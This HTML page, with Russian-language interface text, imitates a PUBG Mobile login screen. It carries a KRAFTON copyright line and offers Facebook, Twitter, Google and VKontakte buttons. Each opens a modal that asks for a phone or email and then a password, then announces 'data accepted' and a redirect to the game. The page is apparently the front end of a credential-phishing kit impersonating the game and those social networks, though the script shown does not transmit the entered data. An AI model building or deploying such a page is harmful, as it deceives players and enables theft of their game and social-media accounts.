<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PUBG MOBILE - Login</title>
    <link href="fonts.googleapis.com" rel="stylesheet">
    <style>
        :root {
            --fb-color: #1877f2;
            --tw-color: #1da1f2;
            --gp-color: #4285f4;
            --vk-color: #0077ff;
            --pubg-gold: #f3ab18;
        }

        body, html {
            margin: 0; padding: 0; height: 100%;
            font-family: 'Roboto', sans-serif;
            background: #000; overflow: hidden;
            color: white;
        }

        /* Фоновый слой */
        .bg {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: url('w.forfun.com') center/cover no-repeat;
            z-index: -1; filter: brightness(0.8);
        }
        .overlay {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background: radial-gradient(circle, transparent 20%, rgba(0,0,0,0.8) 100%);
        }

        /* Главный экран */
        .main-screen {
            display: flex; flex-direction: column; align-items: center;
            justify-content: space-around; height: 100vh; position: relative; z-index: 10;
        }

        .logo { width: 220px; filter: drop-shadow(0 0 10px rgba(0,0,0,0.5)); }

        .social-grid {
            display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px;
            width: 90%; max-width: 340px;
        }

        .social-btn {
            display: flex; align-items: center; justify-content: center;
            height: 50px; border-radius: 4px; cursor: pointer;
            transition: 0.2s; border: 1px solid rgba(255,255,255,0.1);
            font-family: 'Bebas Neue', cursive; font-size: 18px; letter-spacing: 1px;
        }
        .social-btn:active { transform: scale(0.95); }
        .social-btn img { width: 22px; margin-right: 10px; }
        
        .fb { background: var(--fb-color); }
        .tw { background: var(--tw-color); }
        .gp { background: var(--gp-color); }
        .vk { background: var(--vk-color); }

        /* Модальное окно */
        .modal-back {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.85); display: none;
            align-items: center; justify-content: center; z-index: 100;
        }

        .modal-card {
            background: #fff; width: 90%; max-width: 380px;
            border-radius: 8px; color: #333; overflow: hidden;
            animation: slideUp 0.3s ease-out;
        }

        .modal-header {
            padding: 15px; text-align: center; color: white;
            font-weight: bold; position: relative;
        }
        .close-btn {
            position: absolute; right: 15px; top: 12px; cursor: pointer; font-size: 20px;
        }

        .modal-body { padding: 25px; display: flex; flex-direction: column; }
        
        .modal-body h2 { margin: 0 0 10px; font-size: 18px; text-align: center; }
        .modal-body p { font-size: 14px; color: #666; text-align: center; margin-bottom: 20px; }

        input {
            width: 100%; padding: 12px; margin-bottom: 15px;
            border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box;
            font-size: 16px; outline: none;
        }
        input:focus { border-color: var(--pubg-gold); }

        .next-btn {
            background: var(--pubg-gold); color: #000; border: none;
            padding: 12px; border-radius: 4px; font-weight: bold;
            cursor: pointer; font-size: 16px;
        }

        /* Анимации */
        @keyframes slideUp {
            from { transform: translateY(50px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        .hidden { display: none; }
    </style>
</head>
<body>

<div class="bg"></div>
<div class="overlay"></div>

<div class="main-screen">
    <img src="upload.wikimedia.org" class="logo">
    
    <div class="social-grid">
        <div class="social-btn fb" onclick="openLogin('Facebook', '#1877f2')">
            <img src="cdn-icons-png.flaticon.com"> FACEBOOK
        </div>
        <div class="social-btn tw" onclick="openLogin('Twitter', '#1da1f2')">
            <img src="cdn-icons-png.flaticon.com"> TWITTER
        </div>
        <div class="social-btn gp" onclick="openLogin('Google', '#4285f4')">
            <img src="cdn-icons-png.flaticon.com"> GOOGLE
        </div>
        <div class="social-btn vk" onclick="openLogin('VKontakte', '#0077ff')">
            <img src="cdn-icons-png.flaticon.com"> VKONTAKTE
        </div>
    </div>

    <div style="font-size: 10px; opacity: 0.5;">© 2026 KRAFTON, Inc.</div>
</div>

<!-- Модальное окно входа -->
<div id="modal" class="modal-back">
    <div class="modal-card">
        <div id="m-header" class="modal-header">
            <span id="m-title">Login</span>
            <span class="close-btn" onclick="closeLogin()">×</span>
        </div>
        
        <div class="modal-body">
            <div id="step-1">
                <h2 id="input-title">Вход в аккаунт</h2>
                <p id="input-desc">Введите ваш номер телефона или почту</p>
                <input type="text" id="login-input" placeholder="Телефон или почта">
                <button class="next-btn" onclick="goNext()">ДАЛЕЕ</button>
            </div>

            <div id="step-2" class="hidden">
                <h2>Введите пароль</h2>
                <p>Для подтверждения входа в аккаунт</p>
                <input type="password" id="pass-input" placeholder="Пароль">
                <button class="next-btn" onclick="finishLogin()">ВОЙТИ</button>
            </div>
        </div>
    </div>
</div>

<script>
    const modal = document.getElementById('modal');
    const mHeader = document.getElementById('m-header');
    const mTitle = document.getElementById('m-title');
    const step1 = document.getElementById('step-1');
    const step2 = document.getElementById('step-2');
    const loginInput = document.getElementById('login-input');

    let currentNetwork = '';

    function openLogin(network, color) {
        currentNetwork = network;
        modal.style.display = 'flex';
        mHeader.style.backgroundColor = color;
        mTitle.innerText = 'Вход через ' + network;
        
        // Кастомизация под соцсеть
        if(network === 'Facebook') {
            loginInput.placeholder = 'Электронный адрес или номер';
        } else if(network === 'VKontakte') {
            loginInput.placeholder = 'Телефон или почта VK';
        } else {
            loginInput.placeholder = 'Email или ID';
        }
    }

    function closeLogin() {
        modal.style.display = 'none';
        step1.classList.remove('hidden');
        step2.classList.add('hidden');
        loginInput.value = '';
        document.getElementById('pass-input').value = '';
    }

    function goNext() {
        if(loginInput.value.length < 3) {
            alert('Введите корректные данные');
            return;
        }
        step1.classList.add('hidden');
        step2.classList.remove('hidden');
    }

    function finishLogin() {
        const pass = document.getElementById('pass-input').value;
        if(pass.length < 4) {
            alert('Введите пароль');
            return;
        }
        alert('Данные приняты. Перенаправление в игру...');
        closeLogin();
    }

    // Закрытие при клике вне окна
    window.onclick = function(event) {
        if (event.target == modal) closeLogin();
    }
</script>

</body>
</html>
